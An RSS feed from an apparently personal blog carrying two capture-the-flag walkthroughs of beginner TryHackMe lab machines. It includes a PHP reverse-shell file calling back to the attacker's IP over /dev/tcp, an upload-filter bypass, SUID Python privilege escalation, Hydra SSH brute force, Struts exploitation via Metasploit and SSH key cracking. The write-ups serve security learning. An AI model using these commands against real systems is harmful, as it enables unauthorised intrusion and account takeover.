<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>TryHackMe on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tryhackme/</link>
    <description>Recent content in TryHackMe on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 19 May 2021 01:32:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tryhackme/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>TryHackMe - rootme</title>
      <link>https://fahmifj.github.io/tryhackme/rootme/</link>
      <pubDate>Fri, 02 Jul 2021 22:08:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/tryhackme/rootme/</guid>
      <description>A ctf for beginners, can you root me?</description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong>  <a href="https://tryhackme.com/room/rrootme">rootme</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools:</strong>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
</ul>
</li>
<li><strong>Skills Learned</strong>:
<ul>
<li>Web enumeration</li>
<li>SUID exploitation</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: SSH on port 22 and HTTP on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.215.165                      
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-29 23:35 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.215.165
</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.26s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 96.24 seconds
</span></span></code></pre></div><p>Running a script scan didn&rsquo;t really helpful, so I&rsquo;ll dig the website on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website doesn&rsquo;t display anything except a prompt-like text &ldquo;root@rootme:~#&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210530105241967.png" alt="image-20210530105241967"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>Gobuster</code> scan discovers several directories on this website, ones of which interesting are <code>/uploads</code> and <code>/panel</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.215.165/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -z
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.215.165/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 23:37:44 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/js/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/css/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/uploads/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/panel                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/panel/<span class="o">]</span>  
</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>                 
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 23:43:21 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><h4 id="panel">/panel</h4>
<p>On <code>/panel</code>, there is an upload form, but it blocks a file with <code>.php</code> extensions.</p>
<p><div class="img-container"><img src="imgs/image-20210530105345640.png" alt="image-20210530105345640"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Uploading a file with extension <code>.phtml</code> bypasses the upload filter. The uploaded file can be found at <code>/uploads/[here]</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530105538891.png" alt="image-20210530105538891"  /></div>
</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I&rsquo;ll upload the following file and setup a listener to get a shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115»  
</span></span><span class="line"><span class="cl">$ cat iamf.phtml    
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.9.30.115/443 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></div><p>I&rsquo;ll trigger reverse shell by visiting <code> http://10.10.215.165/uploads/iamf.phtml</code> on the browser.</p>
<p><div class="img-container"><img src="imgs/image-20210530105644738.png" alt="image-20210530105644738"  /></div>
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll do the PTY trick to upgrade my shell to interactive one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@rootme:/var/www/html$ which python
</span></span><span class="line"><span class="cl">which python
</span></span><span class="line"><span class="cl">/usr/bin/python
</span></span><span class="line"><span class="cl">www-data@rootme:/var/www/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@rootme:/var/www/html$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">bash-4.4$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> suspended  nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> continued  nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bash-4.4$ 
</span></span></code></pre></div><p>The user flag can be found at <code>/var/www/user.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ find / -type f -user www-data 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc\|sys&#39;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">/var/www/user.txt
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<p>I find out the current Python binary has SUID bit set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;snap&#39;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">/usr/bin/python
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p>Python with SUID can be exploited by executing <code>import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ python -c <span class="s1">&#39;import os; os.execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-p&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">bash-4.4# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210530111120071.png" alt="image-20210530111120071"  /></div>
</p>
<p>I can grab the root flag now.</p>
<p><div class="img-container"><img src="imgs/image-20210530111235501.png" alt="image-20210530111235501"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>TryHackMe - Basic Pentesting</title>
      <link>https://fahmifj.github.io/tryhackme/basic-pentesting/</link>
      <pubDate>Fri, 18 Jun 2021 19:15:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/tryhackme/basic-pentesting/</guid>
      <description>This is a machine that allows you to practise web app hacking and privilege escalation </description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong> <a href="https://tryhackme.com/room/basicpentestingjt">Basic Pentesting</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Type</strong>: Challenge/CTF</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools</strong>:
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>John the Ripper</li>
<li>smbclient</li>
</ul>
</li>
<li><strong>Skills Learned</strong>
<ul>
<li>Basics of enumeration</li>
<li>Brute-force attack</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 &amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).</p>
<p><div class="img-container"><img src="imgs/image-20210530002323622.png" alt="image-20210530002323622"  /></div>
</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is allowed on SMB.</p>
<p><div class="img-container"><img src="imgs/image-20210530004538478-1624087102246.png" alt="image-20210530004538478"  /></div>
</p>
<p>Accessing <code>anonymous</code> share with anonymous logon finds a text file called <code>staff.txt</code>. I&rsquo;ll grab that file to my machine</p>
<p><div class="img-container"><img src="imgs/image-20210530004922142.png" alt="image-20210530004922142"  /></div>
</p>
<p>The contents of <code>staff.txt</code> reveals two potential usernames: <code>jan</code> and <code>kay</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530004937052.png" alt="image-20210530004937052"  /></div>
</p>
<h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Poking the web with <code>curl</code> finds out that it is under maintenance.</p>
<p><div class="img-container"><img src="imgs/image-20210530004040209.png" alt="image-20210530004040209"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> scan discovers one hidden directory called <code>development</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115»
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.67.164/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 13:43:47 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/development          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.67.164/development/<span class="o">]</span>
</span></span></code></pre></div><h4 id="development">/development</h4>
<p>The web has a directory listing enabled on <code>/development</code>, and there are two text files in that directory:  <code>dev.txt</code> and <code>j.txt</code></p>
<p><div class="img-container"><img src="imgs/image-20210530010100831.png" alt="image-20210530010100831"  /></div>
</p>
<p><code>j.txt</code>  contains a note from K to J.</p>
<p><div class="img-container"><img src="imgs/image-20210530010150205.png" alt="image-20210530010150205"  /></div>
</p>
<p>From the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.</p>
<p><code>dev.txt</code> contains about project development logs.</p>
<p><div class="img-container"><img src="imgs/image-20210530010131055.png" alt="image-20210530010131055"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>There are some potential exploits for Apache Structs 2.5.12, which I could try later.</p>
<p><div class="img-container"><img src="imgs/image-20210619142047338.png" alt="image-20210619142047338"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<p>For foothold, I have two options: brute forcing SSH and exploiting Apache Struts.</p>
<p>Brute force might take some time, so I&rsquo;ll leave it on the background and start with Apache Struts.</p>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="apache-struts-rce-cve-2017-9805">Apache Struts RCE CVE-2017-9805</h4>
<p>Metasploit also has an <a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">exploit module</a> for this, so I&rsquo;ll  fire up  <code>metasploit</code>. But, first, I need to find out the URI of the Apache Struts.</p>
<p>Looking back to the <code>dev.txt</code> file, it seems Kay uses this <a href="https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase/2.5.12">example showcase</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210619131650429.png" alt="image-20210619131650429"  /></div>
</p>
<p>I also came across this <a href="https://samsclass.info/124/proj14/p10xstruts.htm">blog post</a> and found this:</p>
<p><div class="img-container"><img src="imgs/image-20210619132136356.png" alt="image-20210619132136356"  /></div>
</p>
<p>I typed <code>http://10.10.67.164/struts2-rest-showcase-2.5.12/</code> in my browser, and it resolved to this page.</p>
<p><div class="img-container"><img src="imgs/image-20210619132449500.png" alt="image-20210619132449500"  /></div>
</p>
<p>I tried it with <code>metasploit</code> and it worked!</p>
<p><div class="img-container"><img src="imgs/image-20210619142842848.png" alt="image-20210619142842848"  /></div>
</p>
<h3 id="shell-as-jan">Shell as jan</h3>
<h4 id="ssh-brute-force">SSH Brute Force</h4>
<p>It turns out <code>Hydra</code> finds Jan&rsquo;s SSH password in less than 2 minutes. The password is <code>armando</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 
</span></span><span class="line"><span class="cl">Hydra v9.0 <span class="o">(</span>c<span class="o">)</span> <span class="m">2019</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 10.10.245.112   login: jan   password: armando
</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-05-29 14:20:56
</span></span></code></pre></div><p>Now I can login as Jan with SSH client.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ ssh jan@10.10.245.112 
</span></span><span class="line"><span class="cl">jan@10.10.245.112<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.4 LTS <span class="o">(</span>GNU/Linux 4.4.0-119-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Last login: Mon Apr <span class="m">23</span> 15:55:45 <span class="m">2018</span> from 192.168.56.102
</span></span><span class="line"><span class="cl">jan@basic2:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span>
</span></span></code></pre></div><p>Since <code>jan</code> has SSH login, I&rsquo;ll definitely use this for enumeration.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In Kay&rsquo;s home directory there is  a readable SSH key</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jan@basic2:/home/kay/.ssh$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">20</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> kay kay <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2018</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> kay kay <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2018</span> ..
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> kay kay  <span class="m">771</span> Apr <span class="m">23</span>  <span class="m">2018</span> authorized_keys
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kay kay <span class="m">3326</span> Apr <span class="m">19</span>  <span class="m">2018</span> id_rsa
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kay kay  <span class="m">771</span> Apr <span class="m">19</span>  <span class="m">2018</span> id_rsa.pub
</span></span></code></pre></div><p>I tried the key for login locally as user Kay but it wanted passphrase, so I&rsquo;ll just grab the private key for cracking.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jan@basic2:/home/kay/.ssh$ cat id_rsa
</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----                                                      
</span></span><span class="line"><span class="cl">Proc-Type: 4,ENCRYPTED                                                               
</span></span><span class="line"><span class="cl">DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75                               
</span></span><span class="line"><span class="cl">                                                                                     
</span></span><span class="line"><span class="cl">IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ                     
</span></span><span class="line"><span class="cl">o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN                     
</span></span><span class="line"><span class="cl">XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX                     
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
</span></span><span class="line"><span class="cl">e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
</span></span><span class="line"><span class="cl">3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><h4 id="cracking-id_rsa">Cracking id_rsa</h4>
<p>I&rsquo;ll convert Kay&rsquo;s <code>id_rsa</code> to hash using <code>ssh2john.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ /usr/share/john/ssh2john.py kay_rsa &gt; kay_rsa.hash<span class="p">;</span> cat kay_rsa.hash
</span></span><span class="line"><span class="cl">kay_rsa:<span class="nv">$sshng$1$16$6</span>ABA7DE35CDB65070B92C1F760E2FE75<span class="nv">$2352$22835</span>bfc9d2ad8f779e84676de801a2712e...&lt;SNIP&gt;...
</span></span></code></pre></div><p><code>JtR</code> finds the password to be <code>beeswax</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530013632605.png" alt="image-20210530013632605"  /></div>
</p>
<h4 id="ssh---kay">SSH - Kay</h4>
<p>Interestingly, Kay&rsquo;s is in the sudo group.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> kay_rsa <span class="o">&amp;&amp;</span> ssh -i kay_rsa kay@10.10.245.112
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;kay_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.4 LTS <span class="o">(</span>GNU/Linux 4.4.0-119-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Last login: Mon Apr <span class="m">23</span> 16:04:07 <span class="m">2018</span> from 192.168.56.102
</span></span><span class="line"><span class="cl">kay@basic2:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
</span></span></code></pre></div><p>From here, I only need Kay&rsquo;s password.</p>
<h4 id="su---root">SU - root</h4>
<p>In Kay&rsquo;s home directory, there is a file called <code>pass.bak</code>. It contains the following string:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kay@basic2:~$ cat pass.bak 
</span></span><span class="line"><span class="cl">heresareallystrongpasswordthatfollowsthepasswordpolicy<span class="nv">$$</span>
</span></span></code></pre></div><p>I tried the string as Kay&rsquo;s password on <code>sudo su -</code> and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kay@basic2:~$ sudo su -
</span></span><span class="line"><span class="cl">root@basic2:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@basic2:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">1017</span> Apr <span class="m">23</span>  <span class="m">2018</span> flag.txt
</span></span></code></pre></div><p>The flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Congratulations! You&#39;ve completed this challenge. There are two ways (that I&#39;m aware of) to gain 
</span></span><span class="line"><span class="cl">a shell, and two ways to privesc. I encourage you to find them all!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">If you&#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few
</span></span><span class="line"><span class="cl">takeaways from this challenge should be that every little bit of information you can find can be
</span></span><span class="line"><span class="cl">valuable, but sometimes you&#39;ll need to find several different pieces of information and combine
</span></span><span class="line"><span class="cl">them to make them useful. Enumeration is key! Also, sometimes it&#39;s not as easy as just finding
</span></span><span class="line"><span class="cl">an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
</span></span><span class="line"><span class="cl">in this series). Usually you&#39;ll have to dig deeper to find things that aren&#39;t as obvious, and
</span></span><span class="line"><span class="cl">therefore might&#39;ve been overlooked by administrators.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you&#39;ll send 
</span></span><span class="line"><span class="cl">me a link! I can be reached at josiah@vt.edu. If you&#39;ve got questions or feedback, please reach
</span></span><span class="line"><span class="cl">out to me.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Happy hacking!
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
